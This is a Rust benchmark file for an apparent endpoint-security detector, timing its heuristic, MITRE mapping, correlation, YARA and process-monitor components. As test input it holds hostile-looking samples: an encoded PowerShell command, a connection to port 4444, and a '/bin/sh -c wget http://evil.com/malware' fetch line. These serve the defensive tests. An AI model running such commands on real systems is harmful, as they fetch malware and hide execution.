use criterion::{criterion_group, criterion_main, Criterion, BenchmarkId};
use std::collections::HashMap;

fn bench_heuristic_engine(c: &mut Criterion) {
    let mut group = c.benchmark_group("heuristic_engine");

    let mut details = HashMap::new();
    details.insert("CommandLine".to_string(), "powershell -encodedcommand".to_string());
    details.insert("ParentProcess".to_string(), "explorer.exe".to_string());

    group.bench_function("analyze_process_creation", |b| {
        b.iter(|| {
            let engine = crate::heuristic_engine::HeuristicEngine::new();
            engine.analyze_process("test.exe", 1234, 567, &details)
        })
    });

    group.bench_function("analyze_network_connection", |b| {
        b.iter(|| {
            let engine = crate::heuristic_engine::HeuristicEngine::new();
            let mut net_details = HashMap::new();
            net_details.insert("remote_ip".to_string(), "185.220.101.45".to_string());
            net_details.insert("remote_port".to_string(), "4444".to_string());
            engine.analyze_network("test.exe", 1234, &net_details)
        })
    });

    group.finish();
}

fn bench_mitre_mapper(c: &mut Criterion) {
    let mut group = c.benchmark_group("mitre_mapper");

    let mapper = crate::mitre::mapper::MitreMapper::new();

    let mut details = HashMap::new();
    details.insert("CommandLine".to_string(), "powershell -encodedcommand".to_string());

    group.bench_function("map_single_event", |b| {
        b.iter(|| {
            mapper.map_event("process_creation", &details)
        })
    });

    group.bench_function("map_event_batch_100", |b| {
        b.iter(|| {
            for _ in 0..100 {
                mapper.map_event("process_creation", &details);
            }
        })
    });

    group.finish();
}

fn bench_correlation_engine(c: &mut Criterion) {
    let mut group = c.benchmark_group("correlation_engine");

    group.bench_function("add_event_1000", |b| {
        b.iter(|| {
            let mut engine = crate::correlation::engine::CorrelationEngine::new();
            for i in 0..1000 {
                let event = crate::correlation::engine::CorrelatedEvent {
                    id: format!("evt-{}", i),
                    timestamp: chrono::Utc::now(),
                    event_type: crate::correlation::engine::EventType::ProcessCreation,
                    process_id: Some(1000 + i as u32),
                    process_name: Some("test.exe".to_string()),
                    parent_id: None,
                    user: Some("user".to_string()),
                    details: HashMap::new(),
                    severity: crate::correlation::engine::Severity::Info,
                };
                engine.add_event(event);
            }
        })
    });

    group.bench_function("get_stats", |b| {
        let mut engine = crate::correlation::engine::CorrelationEngine::new();
        for i in 0..100 {
            let event = crate::correlation::engine::CorrelatedEvent {
                id: format!("evt-{}", i),
                timestamp: chrono::Utc::now(),
                event_type: crate::correlation::engine::EventType::ProcessCreation,
                process_id: Some(1000 + i as u32),
                process_name: Some("test.exe".to_string()),
                parent_id: None,
                user: Some("user".to_string()),
                details: HashMap::new(),
                severity: crate::correlation::engine::Severity::Info,
            };
            engine.add_event(event);
        }
        b.iter(|| {
            engine.get_stats()
        })
    });

    group.finish();
}

fn bench_yara_scanner(c: &mut Criterion) {
    let mut group = c.benchmark_group("yara_scanner");

    group.bench_function("scan_clean_text", |b| {
        let scanner = crate::yara::scanner::YaraScanner::new();
        b.iter(|| {
            scanner.scan_bytes(b"hello world this is clean text")
        })
    });

    group.bench_function("scan_suspicious_text", |b| {
        let scanner = crate::yara::scanner::YaraScanner::new();
        b.iter(|| {
            scanner.scan_bytes(b"/bin/sh -c wget http://evil.com/malware")
        })
    });

    group.finish();
}

fn bench_process_monitor(c: &mut Criterion) {
    let mut group = c.benchmark_group("process_monitor");

    group.bench_function("scan_processes", |b| {
        let mut monitor = crate::process_monitor::ProcessMonitor::new(5000);
        b.iter(|| {
            monitor.scan_processes()
        })
    });

    group.finish();
}

criterion_group!(
    benches,
    bench_heuristic_engine,
    bench_mitre_mapper,
    bench_correlation_engine,
    bench_yara_scanner,
    bench_process_monitor,
);
criterion_main!(benches);
